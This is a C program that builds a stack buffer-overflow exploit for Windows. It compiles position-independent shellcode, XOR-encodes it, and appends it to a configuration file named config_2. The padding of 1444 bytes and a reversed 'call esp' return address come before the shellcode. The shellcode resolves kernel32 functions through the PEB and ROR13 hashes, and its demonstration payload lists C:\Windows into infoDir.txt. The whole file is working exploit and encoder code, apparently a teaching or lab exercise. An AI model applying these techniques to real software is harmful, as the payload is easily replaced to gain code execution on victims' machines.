#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <wchar.h>

#pragma region ShellCode

#define XOR_BYTE 0x5
#define XOR_CODE_SZ 75
#define ACTIVE_CODE_SZ 997

#define Kernel32Dll_HASH 1848363543
#define CreateFileA_HASH 2080380837
#define WriteFile_HASH 3893000479
#define CloseHandle_HASH 268277755
#define ExitProcess_HASH 1944246398
#define FindFirstFileA_HASH 1675018341
#define FindNextFileA_HASH 2783030423
#define FindClose_HASH 592730488

PPEB get_peb(void);
DWORD __stdcall unicode_ror13_hash(const WCHAR* unicode_string);
DWORD __stdcall ror13_hash(const char* string);
HMODULE __stdcall find_kernel32(void);
FARPROC __stdcall find_function(HMODULE module, DWORD hash);
void __stdcall shell_entry();
void __stdcall shell_code();
void END_SHELLCODE(void);

void __stdcall shell_code()
{
	char* p, * begin, xr = XOR_BYTE;
	int sz;

	__asm
	{
		mov ax, ACTIVE_CODE_SZ
		mov sz, eax

		mov eax, ebp
		add eax, XOR_CODE_SZ

		add eax, 4 // add these four bytes to fix start position for decryption

		mov begin, eax
	}

	for (p = begin; p - begin < sz; p++)
		*p ^= xr;

	shell_entry();
}

void __stdcall shell_entry()
{

	HMODULE kernelDll = find_kernel32();

	FARPROC f_CreateFileA = find_function(kernelDll, CreateFileA_HASH);
	FARPROC f_WriteFile = find_function(kernelDll, WriteFile_HASH);
	FARPROC f_CloseHandle = find_function(kernelDll, CloseHandle_HASH);

	FARPROC f_FindFirstFileA = find_function(kernelDll, FindFirstFileA_HASH);
	FARPROC f_FindNextFileA = find_function(kernelDll, FindNextFileA_HASH);
	FARPROC f_FindClose = find_function(kernelDll, FindClose_HASH);

	FARPROC f_ExitProcess = find_function(kernelDll, ExitProcess_HASH);

	const char startDir[] = { 'C',':','\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '*', '\0' };
	WIN32_FIND_DATAA FindFileData;
	void* hf = f_FindFirstFileA(startDir, &FindFileData);

	const char fileString[] = { 'i', 'n', 'f', 'o', 'D', 'i', 'r', '.', 't', 'x', 't', '\0' };
	HANDLE hFile = f_CreateFileA(
		fileString,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		0,
		NULL
	);

	int i = 0;
	const char ch[] = {'\r', '\n', '\0' };
	do {
		if (i > 1) {

			char* p = FindFileData.cFileName;

			while (*p)
				p++;

			int n = p - FindFileData.cFileName;

			DWORD bytesWritten;
			f_WriteFile(
				hFile,
				FindFileData.cFileName,
				n,
				&bytesWritten,
				NULL
			);
			f_WriteFile(
				hFile,
				ch,
				2,
				&bytesWritten,
				NULL
			);
		}
		i++;
	} while (f_FindNextFileA(hf, &FindFileData));

	f_FindClose(hf);

	f_CloseHandle(hFile);

	f_ExitProcess(0);
}

HMODULE __stdcall find_kernel32(void)
{
	PPEB peb = NULL;
	LDR_DATA_TABLE_ENTRY* module_ptr = NULL, * first_mod = NULL;
	PLIST_ENTRY pListEntry = NULL;

	peb = get_peb();

	pListEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
	module_ptr = (PLDR_DATA_TABLE_ENTRY)pListEntry;
	first_mod = module_ptr;

	do
	{
		if (module_ptr->FullDllName.Length != 0 && unicode_ror13_hash((WCHAR*)module_ptr->FullDllName.Buffer) == Kernel32Dll_HASH)
			return (HMODULE)module_ptr->Reserved2[0];
		else
		{
			pListEntry = pListEntry->Flink;
			module_ptr = (PLDR_DATA_TABLE_ENTRY)pListEntry;
		}

	} while (module_ptr && module_ptr != first_mod);

	return INVALID_HANDLE_VALUE;
}

PPEB
__declspec(naked) get_peb(void)
{
	__asm {
		mov eax, fs: [0x30]
		ret
	}
}

DWORD __stdcall unicode_ror13_hash(const WCHAR* unicode_string)
{
	DWORD hash = 0;

	while (*unicode_string != 0)
	{
		DWORD val = (DWORD)*unicode_string++;
		hash = (hash >> 13) | (hash << 19);
		hash += val;
	}

	return hash;
}

DWORD __stdcall ror13_hash(const char* string)
{
	DWORD hash = 0;

	while (*string)
	{
		DWORD val = (DWORD)*string++;
		hash = (hash >> 13) | (hash << 19);
		hash += val;
	}

	return hash;
}

FARPROC __stdcall find_function(HMODULE module, DWORD hash)
{
	IMAGE_DOS_HEADER* dos_header;
	IMAGE_NT_HEADERS* nt_headers;
	IMAGE_EXPORT_DIRECTORY* export_dir;
	DWORD* names, * funcs;
	WORD* nameords;
	unsigned i;

	dos_header = (IMAGE_DOS_HEADER*)module;
	nt_headers = (IMAGE_NT_HEADERS*)((char*)module + dos_header->e_lfanew);
	export_dir = (IMAGE_EXPORT_DIRECTORY*)((char*)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	names = (DWORD*)((char*)module + export_dir->AddressOfNames);
	funcs = (DWORD*)((char*)module + export_dir->AddressOfFunctions);
	nameords = (WORD*)((char*)module + export_dir->AddressOfNameOrdinals);

	for (i = 0; i < export_dir->NumberOfNames; i++)
	{
		char* string = (char*)module + names[i];

		if (hash == ror13_hash(string))
		{
			WORD nameord = nameords[i];
			DWORD funcrva = funcs[nameord];
			return (FARPROC)((char*)module + funcrva);
		}
	}

	return NULL;
}

void __declspec(naked) END_SHELLCODE(void) {}

#pragma endregion ShellCode

unsigned getFileSize(char* path)
{
	FILE* f = fopen(path, "rb");
	fseek(f, 0, SEEK_END);
	long n = ftell(f);
	fclose(f);

	if (n > 0)
		return (unsigned)n;

	return 0;
}

unsigned char find_xor_byte()
{
	for (int byte = 1; byte < 0xFF; byte++)
	{
		BOOL found = FALSE;

		for (char* c = (char*)shell_code + XOR_CODE_SZ; c < (char*)END_SHELLCODE; c++)
		{
			if (*c == byte)
			{
				found = TRUE;
				break;
			}
		}

		if (!found)
			return (unsigned char)byte;
	}

	return 0;
}

BOOL sc_write_conf(char* path, char* path_to)
{
	HANDLE hfile;
	unsigned int size, readed, written;

	char callEspAddrRev[] = "\x97\x12\x50\x62";

	hfile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (hfile == INVALID_HANDLE_VALUE)
	{
		printf("Error, can't open shellcode!\n");
		return FALSE;
	}

	size = GetFileSize(hfile, NULL);

	if (!size)
	{
		printf("Error, file is empty\n");
		return FALSE;
	}

	char* pbuf = (char*)malloc(size);

	if (!ReadFile(hfile, pbuf, size, (LPDWORD)&readed, NULL))
	{
		printf("Error, can't read shellcode data\n");
		free(pbuf);
		CloseHandle(hfile);
		return FALSE;
	}

	CloseHandle(hfile);
	hfile = NULL;

	hfile = CreateFileA(path_to, FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, 0, NULL);

	if (hfile == INVALID_HANDLE_VALUE)
	{
		printf("Error, can't open config file!\n");
		return FALSE;
	}

	char tmp[1444];
	memset(tmp, '!', sizeof(tmp));

	if (!WriteFile(hfile, tmp, sizeof(tmp), (LPDWORD)&written, NULL))
	{
		printf("Error, can't write trash data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	if (!WriteFile(hfile, callEspAddrRev, sizeof(unsigned), (LPDWORD)&written, NULL))
	{
		printf("Error, can't write callespaddr data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	if (!WriteFile(hfile, pbuf, size, (LPDWORD)&written, NULL))
	{
		printf("Error, can't write shellcode data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	free(pbuf);
	CloseHandle(hfile);
	return TRUE;
}

BOOL sc_write_bin(char* path)
{
	int full_code_size = (int)END_SHELLCODE - (int)shell_code;
	int xor_code_size = 0, active_code_size = 0;

	char* buf = (char*)malloc(full_code_size * sizeof(char));
	memcpy(buf, shell_code, full_code_size);

	char* pf = (char*)shell_code;

	while (*pf != (char)0xC3) //0xC3 = ret
	{
		xor_code_size++;
		pf++;
	}

	xor_code_size -= 8;
	active_code_size =
		full_code_size - xor_code_size;

	if (xor_code_size != XOR_CODE_SZ || active_code_size != ACTIVE_CODE_SZ)
	{
		printf("Need to update constant XOR_CODE_SZ to %d\n", xor_code_size);
		printf("Need to update constant ACTIVE_CODE_SZ to %d\n", active_code_size);
		return FALSE;
	}

	unsigned char xr = find_xor_byte();

	if (xr != XOR_BYTE)
	{
		if (xr == 0)
			printf("Fatal: no suitable value for XOR_BYTE\n");
		else
			printf("Need to update XOR_BYTE constant to 0x%x\n", xr);
		return FALSE;
	}

	char* begin = (char*)(buf + xor_code_size);

	for (char* p = begin; p - begin < active_code_size; p++)
		*p ^= XOR_BYTE;

	FILE* output_file = fopen(path, "wb");

	if (!output_file)
	{
		free(buf);
		return FALSE;
	}

	fwrite(buf, full_code_size, sizeof(char), output_file);
	fclose(output_file);
	free(buf);
	return TRUE;
}

int main(int argc, char* argv[])
{
	char* shellcode_file = "shellcode.bin";
	char* config_file = "config_2";
	char* config_file_copy = "config_2_copy";

	CopyFileA(config_file_copy, config_file, FALSE);

	if (!sc_write_bin(shellcode_file))
	{
		printf("Unable to write shell to binary file. Exitting\n");
		return -1;
	}

	if (!sc_write_conf(shellcode_file, config_file))
	{
		printf("Unable to write shell to config file. Exitting\n");
		return -1;
	}

	printf("Success!\n");
	return 0;
}